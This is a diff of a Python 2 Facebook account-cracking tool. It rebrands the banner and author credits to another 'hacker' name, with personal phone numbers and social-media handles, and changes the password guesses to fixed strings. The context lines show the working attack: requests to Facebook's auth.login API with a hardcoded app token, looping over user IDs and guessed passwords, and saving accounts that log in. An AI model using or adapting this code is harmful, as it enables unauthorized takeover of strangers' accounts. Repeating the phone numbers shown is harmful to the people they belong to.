@@ -58,18 +58,18 @@ def hopss(z):
 		time.sleep(0.1)
 ##### LOGO #####
 banner = """
-\x1b[1;91m  _____ _________     ___      _____  _____ _    _ 
-\x1b[1;91m / ____|__   __\ \   / / |    |_   _|/ ____| |  | |
-\x1b[1;91m| (___    | |   \ \_/ /| |      | | | (___ | |__| |
-\x1b[1;91m \___ \   | |    \   / | |      | |  \___ \|  __  |
-\x1b[1;91m ____) |  | |     | |  | |____ _| |_ ____) | |  | |
-\x1b[1;91m|_____/   |_|     |_|  |______|_____|_____/|_|  |_|
-\x1b[1;93m                     (B  O   Y)
+\x1b[1;91m  _________________________________________________
+\x1b[1;91m SPEED HACKER 007 FAMILY ALWAYS ON FIRE 
+\x1b[1;91m HATERZ MAKE ME FAMOUS 
+\x1b[1;91m 909 ST0P PH4D3B44Z 4S4D 49S44R1 09 F1R3
+\x1b[1;91m FB ID ;ASAD ANSARI 
+\x1b[1;91m 
+\x1b[1;93m                     (FREEDOM FIGHTER)
 \x1b[1;94m-----------°°°°°°°°°------------°°°°°°°°°-----
-\x1b[1;92m➣ Coder   : STYLISH BOY
-\x1b[1;92m➣ Github  : HTTPS://GITHUB.COM/STYLISH007
-\x1b[1;92m➣ Facebook:  STYLISH BOY
-\x1b[1;92m➣ Whatsapp: 03497454455
+\x1b[1;92m➣ Coder   : ASAD ANSAARI
+\x1b[1;92m➣ Github  : HTTPS://GITHUB.COM/VIRUSMAKERKINGASAD
+\x1b[1;92m➣ Facebook:  ASAD ANSARI
+\x1b[1;92m➣ Whatsapp: 03034284226
 \x1b[1;94m----------°°°°°°°°°------------°°°°°°°°°----"""
 # titik #
 def tik():
@@ -139,7 +139,7 @@ def men():
 	    hopss('50%...')
 	    hopss('70%...')
 	    hopss('90%...')
-	    hopss('95%...')
+	    hopss('99%...')
 	    os.system('python2 .choice.py')
 	    time.sleep(1)
 	elif rana =="3":
@@ -283,7 +283,7 @@ def crack_menu():
 							crt.close()
 							checkpoint.append(user+pass2)
 						else:
-							pass3 = b['first_name'] + '786'
+							pass3 = '789789'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if "access_token" in q:
@@ -339,7 +339,7 @@ def crack_menu():
 															crt.close()
 															checkpoint.append(user+pass6)
 														else:
-															pass7 = b['last_name'] + '786'
+															pass7 = '000786'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if "access_token" in q:
